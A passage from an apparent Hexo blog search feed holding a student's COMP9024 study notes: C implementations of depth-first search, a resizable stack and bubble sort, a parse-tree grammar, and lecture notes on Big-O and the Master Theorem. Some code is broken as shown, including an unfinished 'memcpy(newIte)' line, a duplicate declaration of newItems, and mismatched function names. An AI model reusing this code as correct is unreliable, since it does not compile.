DOM</code></pre>]]></content>
      
      
      <categories>
          
          <category> GUI </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DepthFirstSearch</title>
      <link href="/2024/11/22/Algorithm/DepthFirstSearch/"/>
      <url>/2024/11/22/Algorithm/DepthFirstSearch/</url>
      
        <content type="html"><![CDATA[<p>redfer to <a href="https://github.com/sheisc/COMP9024/tree/main/Tutorials/Week5">UNSW COMP9024</a></p><ul><li><a href="#recursive">recursive</a></li><li><a href="#non-recursive">non-recursive</a></li></ul><p>Note it’s graph, not only tree!</p><h1 id="recursive"><a href="#recursive" class="headerlink" title="recursive"></a>recursive</h1><pre><code class="lang-C">static void DepthFirstSearch(struct Graph *pGraph, long u, int *visited) &#123;    visited[u] = 1;    printf(&quot;visiting %s\n&quot;, pGraph-&gt;pNodes[u].name);    // recursively visit the adjacent nodes of u, if they have not been visited yet    for(long v = 0; v &lt; pGraph-&gt;n; v++) &#123;        if (MatrixElement(pGraph, u, v) == CONNECTED &amp;&amp; !visited[v]) &#123;            DepthFirstSearch(pGraph, v, visited);        &#125;    &#125;&#125;void RecursiveDFS(struct Graph *pGraph, long u) &#123;    // Note visited is an array, not only an int    int *visited = (int *) malloc(pGraph-&gt;n * sizeof(int));    //memset(visited, 0, sizeof(int) * pGraph-&gt;n);    for (long v = 0; v &lt; pGraph-&gt;n; v++) &#123;        visited[v] = 0;    &#125;    DepthFirstSearch(pGraph, u, visited);    printf(&quot;\n&quot;);    free(visited);&#125;</code></pre><p>For example, search from node 3.</p><p><img src="/2024/11/22/Algorithm/DepthFirstSearch/2024-11-22-16-09-17.png" alt></p><h1 id="non-recursive"><a href="#non-recursive" class="headerlink" title="non-recursive"></a>non-recursive</h1><p>if use non-recursive algorithm, we must use a stack.</p><pre><code class="lang-C">#if 1/*    Please complete the code in Q1-Q5:    Q1:  create a data stack    Q2:  push u onto the data stack    Q3:  test whether the data stack is empty    Q4:  push v onto the data stack    Q5:  free the heap space occupied by the data stack  */void NonRecursiveDFS(struct Graph *pGraph, long u) &#123;    assert(IsLegalNodeNum(pGraph, u));    static long cnt = 0;    int *visited = (int *) malloc(sizeof(int) * pGraph-&gt;n);    // struct Stack *pStack = ______Q1______;    struct Stack *pStack = createStack();    assert(visited &amp;&amp; pStack);    for (long i = 0; i &lt; pGraph-&gt;n; i++) &#123;        visited[i] = 0;    &#125;    printf(&quot;\n\t\t\t\tpush %ld\n&quot;, u);    // ______Q2______;    StackPush(pStack, u);    // while (______Q3______) &#123;    while (!StackIsEmpty(pStack)) &#123;        printf(&quot;\n&quot;);        // If visited the node, just Pop it!        PrintStack(pStack);        STACK_ITEM_T curNodeId = StackPop(pStack);        printf(&quot;\t\t\t\tpop %ld\n&quot;, curNodeId);        if (!visited[curNodeId]) &#123;            visited[curNodeId] = 1;            printf(&quot;\t\t\t\t\t\tvisiting %s\n&quot;, pGraph-&gt;pNodes[curNodeId].name);            // Put all the adjancient node into the stack            for (long v = pGraph-&gt;n - 1; v &gt;= 0; v--) &#123;                if (MatrixElement(pGraph, curNodeId, v) == CONNECTED &amp;&amp; !visited[v]) &#123;                    // ______Q4______;                    StackPush(pStack, v);                    printf(&quot;\t\t\t\tpush %ld\n&quot;, v);                &#125;            &#125;                    &#125;    &#125;    printf(&quot;\n&quot;);    // ______Q5______;    StackRelease(pStack);    free(visited);    &#125;#endif</code></pre>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ParseTree</title>
      <link href="/2024/11/22/Algorithm/ParseTree/"/>
      <url>/2024/11/22/Algorithm/ParseTree/</url>
      
        <content type="html"><![CDATA[<p>refer to <a href="https://github.com/sheisc/COMP9024/tree/main/Tutorials/Week4"></a></p><ul><li><a href="#parse-tree">Parse Tree</a></li><li><a href="#9000--24">9000 + 24</a></li><li><a href="#9000--64">9000 + (6*4)</a></li><li><a href="#parse-tree-operator">Parse Tree Operator</a><ul><li><a href="#primaryexpression">PrimaryExpression</a></li><li><a href="#multiplicativeexpression">MultiplicativeExpression</a></li><li><a href="#additiveexpression">AdditiveExpression</a></li><li><a href="#arithmetic-expression">Arithmetic expression</a></li></ul></li></ul><h1 id="Parse-Tree"><a href="#Parse-Tree" class="headerlink" title="Parse Tree"></a>Parse Tree</h1><p><img src="/2024/11/22/Algorithm/ParseTree/2024-11-22-15-51-04.png" alt></p><h1 id="9000-24"><a href="#9000-24" class="headerlink" title="9000 + 24"></a>9000 + 24</h1><p><img src="/2024/11/22/Algorithm/ParseTree/2024-11-22-15-50-03.png" alt></p><h1 id="9000-6-4"><a href="#9000-6-4" class="headerlink" title="9000 + (6*4)"></a>9000 + (6*4)</h1><p><img src="/2024/11/22/Algorithm/ParseTree/2024-11-22-15-50-17.png" alt></p><h1 id="Parse-Tree-Operator"><a href="#Parse-Tree-Operator" class="headerlink" title="Parse Tree Operator"></a>Parse Tree Operator</h1><h2 id="PrimaryExpression"><a href="#PrimaryExpression" class="headerlink" title="PrimaryExpression"></a>PrimaryExpression</h2><pre><code>PrimaryExpression:    NUM    (Expression)</code></pre><h2 id="MultiplicativeExpression"><a href="#MultiplicativeExpression" class="headerlink" title="MultiplicativeExpression"></a>MultiplicativeExpression</h2><pre><code>MultiplicativeExpression:        PrimaryExpression        PrimaryExpression  mop PrimaryExpression  ...   mop PrimaryExpression  // multiplicative operatormop:            *              / </code></pre><h2 id="AdditiveExpression"><a href="#AdditiveExpression" class="headerlink" title="AdditiveExpression"></a>AdditiveExpression</h2><pre><code>AdditiveExpression:      MultiplicativeExpression      MultiplicativeExpression  aop MultiplicativeExpression  ...   aop MultiplicativeExpression  // additive operatoraop:            +              -</code></pre><h2 id="Arithmetic-expression"><a href="#Arithmetic-expression" class="headerlink" title="Arithmetic expression"></a>Arithmetic expression</h2><pre><code>Expression:      AdditiveExpression</code></pre>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Stack</title>
      <link href="/2024/11/22/Algorithm/Stack/"/>
      <url>/2024/11/22/Algorithm/Stack/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#base-conversion">Base conversion</a></li><li><a href="#enlarge-the-size">Enlarge the size</a></li></ul><p>Refer to <a href="https://github.com/sheisc/COMP9024/tree/main/Tutorials/Week3">UNSW COMP9024</a></p><h1 id="Base-conversion"><a href="#Base-conversion" class="headerlink" title="Base conversion"></a>Base conversion</h1><pre><code class="lang-C">typedef long STACK_ITEM_T;void PrintInteger(STACK_ITEM_T x, int base) &#123;    struct Stack *pStack = CreateStack();    int r;    x = (x &gt;= 0 ? x : -x);    base = (base &gt;= 0 ? base: -base);    printf(&quot;------------- x = %ld, base = %d -------------\n\n&quot;, (long) x, base);    // push the remainders onto the stack    do &#123;        r = x % base;        x = x / base;        printf(&quot;push %d\n&quot;, r);        StackPush(pStack, r);    &#125; while (x != 0);    printf(&quot;\n\nAfter popping (First In Last Out):\n\n&quot;);    PrintPrefix(base);    // output the remainders in the FILO order    while(!StackIsEmpty(pStack)) &#123;        r = StackPop(pStack);        // see https://www.asciitable.com/        // IF-ELSE just want to output A==10, B==11, ... F==15        // LIFO is OK, Last digit put into the stack is the highest digit of other Base.        if (r &lt;= 9) &#123;            // 1 --&gt; &#39;1&#39; (0x31, 49); ...            // 1 + 48 == 49            printf(&quot;%c&quot;, r + 48);        &#125; else if (r &lt;= 15) &#123;            // 10 --&gt; &#39;A&#39; (0x41, 65);  11 --&gt; &#39;B&#39;, ...            // 10 + 55 == 65            printf(&quot;%c&quot;, r + 55);        &#125; else &#123;            // unknown base            printf(&quot;?&quot;);        &#125;    &#125;    ReleaseStack(pStack);    printf(&quot;\n&quot;);&#125;</code></pre><pre><code>Week3$ makeWeek3$ ./main------------- x = 20249024, base = 10 -------------push 4push 2push 0push 9push 4push 2push 0push 2After popping (First In Last Out):20249024------------- x = 20249024, base = 16 -------------push 0push 12push 9push 15push 4push 3push 1After popping (First In Last Out):0x134F9C0------------- x = 20249024, base = 8 -------------push 0push 0push 7push 4push 7push 1push 5push 1push 1After popping (First In Last Out):0o115174700------------- x = 20249024, base = 2 -------------push 0push 0push 0push 0push 0push 0push 1push 1push 1push 0push 0push 1push 1push 1push 1push 1push 0push 0push 1push 0push 1push 1push 0push 0push 1After popping (First In Last Out):0b1001101001111100111000000</code></pre><h1 id="Enlarge-the-size"><a href="#Enlarge-the-size" class="headerlink" title="Enlarge the size"></a>Enlarge the size</h1><pre><code class="lang-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;#include &lt;string.h&gt;#include &quot;Stack.h&quot;// number of items, not in bytes#define INITIAL_STACK_SIZE   64// the top position when a stack is empty#define TOP_POS_FOR_EMPTY_STACK  -1// The type defintion of our Stackstruct Stack &#123;    // the current capacity size of a stack, in the number of items, not in bytes    long size;    // the stack top position    long top;    // pItems points to an array dynamically allocated in heap    STACK_ITEM_T *pItems;&#125;;// Test whether the stack is fullstatic int StackIsFull(struct Stack *pStack) &#123;    return pStack-&gt;top == pStack-&gt;size - 1;    &#125;// Test whether the stack is emptyint StackIsEmpty(struct Stack *pStack) &#123;    return pStack-&gt;top == TOP_POS_FOR_EMPTY_STACK;&#125;// Create a stackstruct Stack *CreateStack(void) &#123;    struct Stack *pStack;    STACK_ITEM_T *pItems;    //printf(&quot;sizeof(STACK_ITEM_T) == %ld\n&quot;, sizeof(STACK_ITEM_T));    pStack = (struct Stack *) malloc(sizeof(struct Stack));    pItems = (STACK_ITEM_T *) malloc(sizeof(STACK_ITEM_T) * INITIAL_STACK_SIZE);    assert(pStack &amp;&amp; pItems);    pStack-&gt;size = INITIAL_STACK_SIZE;        pStack-&gt;top = TOP_POS_FOR_EMPTY_STACK;    pStack-&gt;pItems = pItems;    return pStack;&#125;// Release the heap spacevoid ReleaseStack(struct Stack *pStack) &#123;    if (pStack) &#123;        free(pStack-&gt;pItems);        free(pStack);    &#125;&#125;// Push an item onto/at the top of the stack void StackPush(struct Stack *pStack, STACK_ITEM_T item) &#123;    if (StackIsFull(pStack)) &#123;        // if the Stack is not enough, it would increase its size automatically        /*            Please complete the following code in Q1-Q5.            Q1. call malloc() to allocate enough bytes of heap memory,                and save the return value in a pointer variable named as newItems                       Q2. call memcpy() to copy the items pointed to by pStack-&gt;pItems                 to the heap memory pointed to by newItems                For help, please type &#39;man memcpy&#39; in the command line.                $ man memcpy            Q3. call free() to release the unused heap memory            Q4. double the capacity size of the stack            Q5. let pStack-&gt;pItems point to the heap space allocated in Q1            You need to echo these questions in our weekly Quiz.            Our tutors will NOT answer these questions in the tutorial.            To test the code you have completed, you can set INITIAL_STACK_SIZE to be 2 (line 8 in Stack.c)         */        // Double the capacity of the stack                // Q1. ___________________        STACK_ITEM_T *newItems = (STACK_ITEM_T *) malloc(pStack-&gt;size * 2 * sizeof(STACK_ITEM_T));        // Q2. ___________________        memcpy(newIte)        // Q3. ___________________        // Q4. ___________________        // Q5. ___________________         // Q1. Allocate memory for the new stack items array with double the size        long newSize = pStack-&gt;size * 2; // Double the current size        STACK_ITEM_T *newItems = (STACK_ITEM_T *)malloc(sizeof(STACK_ITEM_T) * newSize);        assert(newItems); // Ensure memory allocation was successful        // Q2. Copy the old items to the new items array        // memcpy would copy the second parameter context into the parameter        memcpy(newItems, pStack-&gt;pItems, sizeof(STACK_ITEM_T) * pStack-&gt;size);        // Q3. Free the old items array        free(pStack-&gt;pItems);        // Q4. Update the stack&#39;s size to the new size        pStack-&gt;size *=2;        // Q5. Point to the new items array        pStack-&gt;pItems = newItems;    &#125;    // Now the stack is not full. Let us do the push operation.    pStack-&gt;top++;    pStack-&gt;pItems[pStack-&gt;top] = item;&#125;// Pop the top item from the stackSTACK_ITEM_T StackPop(struct Stack *pStack) &#123;    assert(!StackIsEmpty(pStack));    STACK_ITEM_T item = pStack-&gt;pItems[pStack-&gt;top];    pStack-&gt;top--;    return item;&#125;// Peek the top item without poppingSTACK_ITEM_T StackPeek(struct Stack *pStack) &#123;    assert(!StackIsEmpty(pStack));    STACK_ITEM_T item = pStack-&gt;pItems[pStack-&gt;top];    return item;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BubbleSort</title>
      <link href="/2024/11/22/Algorithm/BubbleSort/"/>
      <url>/2024/11/22/Algorithm/BubbleSort/</url>
      
        <content type="html"><![CDATA[<p>The raw code refers to: <a href="https://github.com/sheisc/COMP9024/tree/main/Tutorials/Week2">UNSW COMP9024</a></p><pre><code class="lang-C">#include &lt;stdio.h&gt;/*    Swap the values of the two integer variables pointed to by pa and pb, respectively.   */void Swap(int *pa, int *pb) &#123;    int tmp = *pa;    *pa = *pb;    *pb = tmp;&#125;/*  Why Swap2(int a, int b) doesn&#39;t work?    Only the values of the two parameters a and b are swapped. */void Swap2(int a, int b) &#123;    printf(&quot;a = %d, b = %d\n&quot;, a, b);    int tmp = a;    a = b;    b = tmp;    printf(&quot;a = %d, b = %d\n&quot;, a, b);&#125;/*    void PrintArray(int *ptr, int n);        Print the values of the n integer variables pointed to by an pointer ptr:            ptr[0],  ptr[1],    ptr[2],    ...,  ptr[n-1]        or             *ptr,   *(ptr+1),  *(ptr+2),   ...,  *(ptr + n -1) */void PrintArray(int *ptr, int n) &#123;    for (int i = 0; i &lt; n; i++) &#123;        printf(&quot;%d &quot;, ptr[i]);    &#125;    printf(&quot;\n&quot;);&#125;/*    Bubble sort the n numbers pointed to by ptr.    The elements are sorted in ascending order (from the least to the greatest). */void BubbleSort(int *ptr, int n) &#123;    /*        1. iMax represents the max value of i in a pass              (in the following &quot;if (ptr[i] &gt; ptr[i+1])&quot;)        2. (n-1) passes needed in Bubble Sort     */    for (int iMax = n - 2; iMax &gt;= 0; iMax--) &#123; // (n-1) passes        // printf() is quite useful in observing the behavior of a program        printf(&quot;............... iMax = %d ...............\n\n&quot;, iMax);        PrintArray(ptr, iMax + 2);        printf(&quot;\n\n&quot;);        // i is in [0, iMax] in the current pass        for (int i = 0; i &lt;= iMax; i++) &#123;            if (ptr[i] &gt; ptr[i+1]) &#123;                Swap(ptr + i, ptr + i + 1);                printf(&quot;After swapping ptr[%d] and ptr[%d]:\n&quot;, i, i+1);                PrintArray(ptr, iMax + 2);                printf(&quot;\n&quot;);            &#125;        &#125;           &#125;&#125;#if 1int IsLess(int a, int b) &#123;    return a &lt; b;&#125;int IsLarger(int a, int b) &#123;    return a &gt; b;&#125;// Define a function pointer type, which points to a functiontypedef int (*ComparatorFuncPtr)(int, int);void BubbleSort2(int *ptr, int n, ComparatorFuncPtr compare) &#123;    for (int iMax = n - 2; iMax &gt;= 0; iMax--) &#123;        // for (int i = 0; ____Q1_____; _____Q2____) &#123;          for (int i = 0; i&lt;=iMax; i++) &#123;        //     if (_____Q3_____) &#123;          if (compare(ptr[i], ptr[i+1])) &#123;        //         ____Q4____;              swap(ptr+i, ptr+i+1);              // swap(&amp;ptr[i], &amp;ptr[i+1]); is also OK            &#125;        &#125;           &#125;&#125;int TestBubbleSort2(void) &#123;        int arr[] = &#123;30, 50, 20, 10, 60, 40&#125;;    int len = sizeof(arr) / sizeof(arr[0]);    // a function pointer variable which points to the function IsLarger()    ComparatorFuncPtr fptr = &amp;IsLarger;        printf(&quot;Before sorting:\n&quot;);    PrintArray(arr, len);    BubbleSort2(arr, len, fptr);    // in ascending order    printf(&quot;After sorting:\n&quot;);    PrintArray(arr, len);    // a function pointer variable which points to the function IsLess()    // fptr = ____Q5____;        fptr=IsLess; // Both `IsLess` and `&amp;IsLess` is OK, they are all function pointer. The function pointer declarification:  typedef int (*ComparatorFuncPtr)(int, int);    printf(&quot;\nBefore sorting:\n&quot;);    PrintArray(arr, len);    BubbleSort2(arr, len, fptr);    // in descending order    printf(&quot;After sorting:\n&quot;);    PrintArray(arr, len);    return 0;&#125;#endifint main(void) &#123;        // Let the C compiler determine the number of array elements for us.    int arr[] = &#123;30, 50, 20, 10, 60, 40&#125;;    // calculate the number of elements    int len = sizeof(arr) / sizeof(arr[0]);    // int t1 = sizeof(arr);  // print 24    // int t2 = sizeof(arr[0]);  // print 4    // int t3 = sizeof(arr+1);  // print 8    // arr is an array; arr[0] is a value;     // sizeof(arr) means the size of the array    // sizeof(arr+1) means the size of the address (arr+1), in 64-bit OS, it&#39;s always 8 Bytes.    // refer to my blog: https://senranja.github.io/2024/10/30/Cpp/Declaring-arrays-and-out-of-bounds/    // they have nusances when use sizeof() function.    printf(&quot;Before sorting:\n&quot;);    PrintArray(arr, len);    BubbleSort(arr, len);    printf(&quot;After sorting:\n&quot;);    PrintArray(arr, len);    printf(&quot;\n\nWhy Swap2(i, j) doesn&#39;t work?\n\n&quot;);    int i = 20, j = 24;    printf(&quot;i = %d, j = %d\n\n&quot;, i, j);    printf(&quot;\nSwap2(i, j)\n&quot;);    // The values of i and j are passed.    Swap2(i, j);    printf(&quot;i = %d, j = %d\n\n&quot;, i, j);    printf(&quot;After completing the code in Q1-Q5 (BubbleSort.c), please also uncomment line %d in %s:\n\n&quot;, (__LINE__ + 1), __FILE__);    TestBubbleSort2();    return 0;&#125;</code></pre><p>Output:</p><pre><code>Before sorting:30 50 20 10 60 40 ............... iMax = 4 ...............30 50 20 10 60 40 After swapping ptr[1] and ptr[2]:30 20 50 10 60 40 After swapping ptr[2] and ptr[3]:30 20 10 50 60 40 After swapping ptr[4] and ptr[5]:30 20 10 50 40 60 ............... iMax = 3 ...............30 20 10 50 40 After swapping ptr[0] and ptr[1]:20 30 10 50 40 After swapping ptr[1] and ptr[2]:20 10 30 50 40 After swapping ptr[3] and ptr[4]:20 10 30 40 50 ............... iMax = 2 ...............20 10 30 40 After swapping ptr[0] and ptr[1]:10 20 30 40 ............... iMax = 1 ...............10 20 30 ............... iMax = 0 ...............10 20 After sorting:10 20 30 40 50 60 Why Swap2(i, j) doesn&#39;t work?z5541664@vx17:~/COMP9024/Tutorials/Week2$ lsbuild  diagrams  images  main  Makefile  README.md  srcz5541664@vx17:~/COMP9024/Tutorials/Week2$ ./main Before sorting:30 50 20 10 60 40 ............... iMax = 4 ...............30 50 20 10 60 40 After swapping ptr[1] and ptr[2]:30 20 50 10 60 40 After swapping ptr[2] and ptr[3]:30 20 10 50 60 40 After swapping ptr[4] and ptr[5]:30 20 10 50 40 60 ............... iMax = 3 ...............30 20 10 50 40 After swapping ptr[0] and ptr[1]:20 30 10 50 40 After swapping ptr[1] and ptr[2]:20 10 30 50 40 After swapping ptr[3] and ptr[4]:20 10 30 40 50 ............... iMax = 2 ...............20 10 30 40 After swapping ptr[0] and ptr[1]:10 20 30 40 ............... iMax = 1 ...............10 20 30 ............... iMax = 0 ...............10 20 After sorting:10 20 30 40 50 60 Why Swap2(i, j) doesn&#39;t work?i = 20, j = 24Swap2(i, j)a = 20, b = 24a = 24, b = 20i = 20, j = 24After completing the code in Q1-Q5 (BubbleSort.c), please also uncomment line 156 in src/BubbleSort.c:Before sorting:30 50 20 10 60 40 90 60 120 150 35 After sorting:10 20 30 35 40 50 60 60 90 120 150</code></pre>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Algorithmic_Analysis</title>
      <link href="/2024/11/20/Math/Algorithmic-Analysis/"/>
      <url>/2024/11/20/Math/Algorithmic-Analysis/</url>
      
        <content type="html"><![CDATA[<p>Lecture 18: Algorithmic Analysis</p><ul><li><a href="#motivation">Motivation</a><ul><li><a href="#issues">Issues</a></li><li><a href="#order-of-growth">Order of growth</a></li></ul></li><li><a href="#standard-approach">Standard Approach</a><ul><li><a href="#algorithmic-analysis">Algorithmic analysis</a></li><li><a href="#elementary-operations">Elementary operations</a></li></ul></li><li><a href="#examples">Examples</a><ul><li><a href="#running-time-vs-execution-time">Running time vs Execution time</a></li><li><a href="#squaring">Squaring</a></li><li><a href="#cubing">Cubing</a></li></ul></li><li><a href="#simplifying-with-worst-case-and-big-o">Simplifying with Worst Case and Big-O</a><ul><li><a href="#worst-case-and-big-o">Worst-case and big-O</a></li><li><a href="#sum-of-square">sum of Square</a></li><li><a href="#find-an-element-from-an-array">Find an element from an array</a></li></ul></li><li><a href="#recursive-examples">Recursive Examples</a><ul><li><a href="#factorial">Factorial</a></li><li><a href="#master-theorom">Master Theorom</a></li><li><a href="#sum-elements-of-a-linked-list">Sum elements of a linked list</a></li><li><a href="#insertion-sort">Insertion sort</a></li><li><a href="#euclidean-algorithm">Euclidean algorithm</a></li><li><a href="#recursive-examples-1">Recursive examples</a></li></ul></li><li><a href="#faster-euclidean">Faster Euclidean</a><ul><li><a href="#pow">pow</a></li></ul></li></ul><h1 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h1><p>Want to compare algorithms– particularly ones that can solve arbitrarily large instances.</p><p>We would like to be able to talk about the resources (running time, memory, energy consumption) required by a program/algorithm as a function f (n) of some parameter n (e.g. the size) of its input.</p><p>Example</p><p>How long does a given sorting algorithm take to run on a list of n elements?</p><h2 id="Issues"><a href="#Issues" class="headerlink" title="Issues"></a>Issues</h2><p><strong>Problems</strong></p><ol><li>The exact resources required for an algorithm are difficult to pin down. Heavily dependent on:</li></ol><ul><li>Environment the program is run in (hardware, software, choice of language, external factors, etc)</li><li>Choice of inputs used</li></ul><ol><li>Cost functions can be complex, e.g.</li></ol><script type="math/tex; mode=display">2 n log(n) + (n −100) log(n)^2 + \frac{1}{2^n} log(log(n))</script><p>Need to identify the “important” aspects of the function.</p><h2 id="Order-of-growth"><a href="#Order-of-growth" class="headerlink" title="Order of growth"></a>Order of growth</h2><p>Consider two <strong>time-cost</strong> functions:</p><ul><li>$f_1(n)=\frac{1}{10}n^2$ milliseconds, and</li><li>$f_2(n)=10n log n$ milliseconds</li></ul><div class="table-container"><table><thead><tr><th>Input size</th><th>f1(n)</th><th>f2(n)</th></tr></thead><tbody><tr><td>100</td><td>0.01s</td><td>2s</td></tr><tr><td>1000</td><td>1s</td><td>30s</td></tr><tr><td>10000</td><td>1m40s</td><td>6m40s</td></tr><tr><td>100000</td><td>2h47m</td><td>1h23m</td></tr><tr><td>1000000</td><td>11d14h</td><td>16h40m</td></tr><tr><td>10000000</td><td>3y3m</td><td>8d2h</td></tr></tbody></table></div><h1 id="Standard-Approach"><a href="#Standard-Approach" class="headerlink" title="Standard Approach"></a>Standard Approach</h1><h2 id="Algorithmic-analysis"><a href="#Algorithmic-analysis" class="headerlink" title="Algorithmic analysis"></a>Algorithmic analysis</h2><p>Asymptotic analysis is about how costs <strong>scale</strong> as the input increases.</p><p>Standard (default) approach:</p><ul><li>Consider <strong>asymptotic growth</strong> of cost functions</li><li>Consider <strong>worst-case</strong> (highest cost) inputs</li><li>Consider <strong>running time cost</strong>: number of elementary operations</li></ul><p><strong>Take Notice</strong></p><p>Other common analyses include:</p><ul><li>Average-case analysis</li><li>Space (memory) cost</li></ul><h2 id="Elementary-operations"><a href="#Elementary-operations" class="headerlink" title="Elementary operations"></a>Elementary operations</h2><p>Informally: A single computational “step”; something that takes a constant number of computation cycles.</p><p>Examples:</p><ul><li>Arithmetic operations</li><li>Comparison of two values</li><li>Assignment of a value to a variable</li><li>Accessing an element of an array</li><li>Calling a function</li><li>Returning a value</li><li>Printing a single character</li></ul><p><strong>Take Notice</strong></p><p>Count operations up to a constant factor, <strong>O(1)</strong>, rather than an exact number.</p><h1 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h1><p>Squaring a number (First version):</p><pre><code>square(n) :    return n ∗ n // ------ O(1)</code></pre><p><strong>Running time</strong>: O(1)</p><h2 id="Running-time-vs-Execution-time"><a href="#Running-time-vs-Execution-time" class="headerlink" title="Running time vs Execution time"></a>Running time vs Execution time</h2><p>Previous example shows one difference between running time and execution time.</p><p>In general, running time only approximates execution time:</p><ul><li>Simplifying assumptions about elementary operations</li><li>Hidden constants in <strong>big-O</strong></li><li><strong>Big-O</strong> only looks at limiting performance as n gets large.</li></ul><p>Implementations of square(n) will take longer as n gets bigger</p><h2 id="Squaring"><a href="#Squaring" class="headerlink" title="Squaring"></a>Squaring</h2><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-13-48-32.png" alt></p><h2 id="Cubing"><a href="#Cubing" class="headerlink" title="Cubing"></a>Cubing</h2><p>Note the function square() is from the above algorithm, hence it’s n loop of $O(n) -&gt; O(n^2)$</p><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-13-49-08.png" alt></p><h1 id="Simplifying-with-Worst-Case-and-Big-O"><a href="#Simplifying-with-Worst-Case-and-Big-O" class="headerlink" title="Simplifying with Worst Case and Big-O"></a>Simplifying with Worst Case and Big-O</h1><h2 id="Worst-case-and-big-O"><a href="#Worst-case-and-big-O" class="headerlink" title="Worst-case and big-O"></a>Worst-case and big-O</h2><p>Worst-case input assumption and big-O combine to simplify the analysis:</p><p>注意，这里的 <code>for i = 1 to n:</code> 这里的$O(1)$ 是  <code>i=1</code>，这里是 n times 所以整个for循环后面需要再 n times 成 $O(n^2)$。有循环的情况下，需要一层一层分析，先不考虑循环去看每个单独的执行语句进行<strong>和</strong>操作，再用<strong>for循环</strong>进行<strong>乘</strong>操作。</p><h2 id="sum-of-Square"><a href="#sum-of-Square" class="headerlink" title="sum of Square"></a>sum of Square</h2><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-13-55-58.png" alt></p><p><strong>Take Notice</strong></p><p>Simplifications might lead to <strong>sub-optimal bounds</strong>, may have to do a better analysis to get best bounds:</p><ul><li>Finer-grained upper bound analysis</li><li>Analyse specific cases to find a matching lower bound (big-Ω)</li></ul><p>Take Notice</p><p>Big-Ω is a <strong>lower bound</strong> analysis of the worst-case; NOT a “best-case” analysis.</p><p>Analyse specific cases to find a matching <strong>lower bound (big-Ω)</strong></p><h2 id="Find-an-element-from-an-array"><a href="#Find-an-element-from-an-array" class="headerlink" title="Find an element from an array"></a>Find an element from an array</h2><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-02-09.png" alt></p><h1 id="Recursive-Examples"><a href="#Recursive-Examples" class="headerlink" title="Recursive Examples"></a>Recursive Examples</h1><p>此处涉及了递归那里的“master theorem”</p><h2 id="Factorial"><a href="#Factorial" class="headerlink" title="Factorial"></a>Factorial</h2><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-04-10.png" alt></p><p>I listed the Master Theorem and Linear differences here, please regard the a=1 condition to apply the <code>T(n)</code> above.</p><h2 id="Master-Theorom"><a href="#Master-Theorom" class="headerlink" title="Master Theorom"></a>Master Theorom</h2><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-28-09.png" alt></p><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-29-17.png" alt></p><h2 id="Sum-elements-of-a-linked-list"><a href="#Sum-elements-of-a-linked-list" class="headerlink" title="Sum elements of a linked list"></a>Sum elements of a linked list</h2><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-33-18.png" alt></p><p>the k=1, so it’s $O(n^{1+1})=O(n^2)$</p><h2 id="Insertion-sort"><a href="#Insertion-sort" class="headerlink" title="Insertion sort"></a>Insertion sort</h2><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-35-31.png" alt></p><h2 id="Euclidean-algorithm"><a href="#Euclidean-algorithm" class="headerlink" title="Euclidean algorithm"></a>Euclidean algorithm</h2><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-37-00.png" alt></p><h2 id="Recursive-examples"><a href="#Recursive-examples" class="headerlink" title="Recursive examples"></a>Recursive examples</h2><p>Euclidean algorithm for $gcd(m,n) (N = m + n)$:</p><p>Running time: $O(N)$</p><p><strong>Take Notice</strong></p><p>N is not the input <strong>size</strong>. Input size is $log(m) + log(n)$</p><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-41-22.png" alt></p><p><img src="/2024/11/20/Math/Algorithmic-Analysis/N=m+n.png" alt></p><h1 id="Faster-Euclidean"><a href="#Faster-Euclidean" class="headerlink" title="Faster Euclidean"></a>Faster Euclidean</h1><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-53-33.png" alt></p><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-57-34.png" alt></p><h2 id="pow"><a href="#pow" class="headerlink" title="pow"></a>pow</h2><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-57-58.png" alt></p><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-58-13.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Graph_Theory</title>
      <link href="/2024/11/19/Math/Graph-Theory/"/>
      <url>/2024/11/19/Math/Graph-Theory/</url>
      
